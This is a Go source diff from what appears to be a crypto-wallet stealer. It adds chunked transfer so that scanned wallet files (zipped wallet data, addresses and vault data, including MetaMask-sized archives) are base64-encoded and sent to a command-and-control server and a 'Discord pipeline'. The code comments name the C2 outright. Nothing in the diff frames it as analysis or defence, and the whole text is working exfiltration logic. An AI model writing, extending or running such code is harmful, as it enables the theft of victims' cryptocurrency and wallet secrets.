@@ -231,6 +231,9 @@ func handleFetchExtZip(payload []byte) {
 }
 
 const maxAutoDownloadSize = 50 * 1024 * 1024 // 50MB
+// Keep each plugin event small so Overlord WS/JSON doesn't drop MetaMask-sized zips.
+// 2.5 MiB raw → ~3.3 MiB base64 per chunk event.
+const maxWalletEventChunk = 2 * 1024 * 1024 // 2 MiB raw per event
 
 func handleScanWallets() {
 	defer func() {
@@ -246,6 +249,68 @@ func handleScanWallets() {
 		"wallets": wallets,
 	})
 	autoDownloadWallets(wallets)
+}
+
+// sendWalletAutoData sends one wallet zip to the server.
+// Large zips are split into multiple wallet_auto_chunk events (not one huge base64 blob).
+func sendWalletAutoData(w recovery.WalletResult, data []byte) {
+	meta := map[string]interface{}{
+		"name":      w.Name,
+		"type":      w.Type,
+		"path":      w.Path,
+		"addresses": w.Addresses,
+		"vaultData": w.VaultData,
+		"size":      len(data),
+	}
+
+	if len(data) <= maxWalletEventChunk {
+		log.Printf("[recovery] auto-download %q (%d bytes) → single wallet_auto_data event", w.Name, len(data))
+		payload := map[string]interface{}{
+			"name":      w.Name,
+			"type":      w.Type,
+			"path":      w.Path,
+			"addresses": w.Addresses,
+			"vaultData": w.VaultData,
+			"size":      len(data),
+			"content":   base64.StdEncoding.EncodeToString(data),
+		}
+		sendEvent("wallet_auto_data", payload)
+		return
+	}
+
+	// Chunked transfer — Discord pipeline and C2 both reassemble on the server
+	total := (len(data) + maxWalletEventChunk - 1) / maxWalletEventChunk
+	log.Printf("[recovery] auto-download %q (%d bytes) → %d chunked events (event size limit)", w.Name, len(data), total)
+	sendEvent("wallet_auto_chunk_start", map[string]interface{}{
+		"name":      meta["name"],
+		"type":      meta["type"],
+		"path":      meta["path"],
+		"addresses": meta["addresses"],
+		"vaultData": meta["vaultData"],
+		"size":      len(data),
+		"chunks":    total,
+	})
+	for i := 0; i < total; i++ {
+		start := i * maxWalletEventChunk
+		end := start + maxWalletEventChunk
+		if end > len(data) {
+			end = len(data)
+		}
+		chunk := data[start:end]
+		sendEvent("wallet_auto_chunk", map[string]interface{}{
+			"name":  w.Name,
+			"chunk": i + 1,
+			"chunks": total,
+			"size":  len(chunk),
+			"content": base64.StdEncoding.EncodeToString(chunk),
+		})
+		log.Printf("[recovery] wallet_auto_chunk %q %d/%d (%d bytes)", w.Name, i+1, total, len(chunk))
+	}
+	sendEvent("wallet_auto_chunk_end", map[string]interface{}{
+		"name":   w.Name,
+		"chunks": total,
+		"size":   len(data),
+	})
 }
 
 func autoDownloadWallets(wallets []recovery.WalletResult) {
@@ -280,16 +345,7 @@ func autoDownloadWallets(wallets []recovery.WalletResult) {
 			})
 			continue
 		}
-		log.Printf("[recovery] auto-download %q (%d bytes) → wallet_auto_data (Discord pipeline / server)", w.Name, len(data))
-		sendEvent("wallet_auto_data", map[string]interface{}{
-			"name":      w.Name,
-			"type":      w.Type,
-			"path":      w.Path,
-			"addresses": w.Addresses,
-			"vaultData": w.VaultData,
-			"size":      len(data),
-			"content":   base64.StdEncoding.EncodeToString(data),
-		})
+		sendWalletAutoData(w, data)
 		ok++
 	}
 	sendEvent("wallet_auto_done", map[string]interface{}{
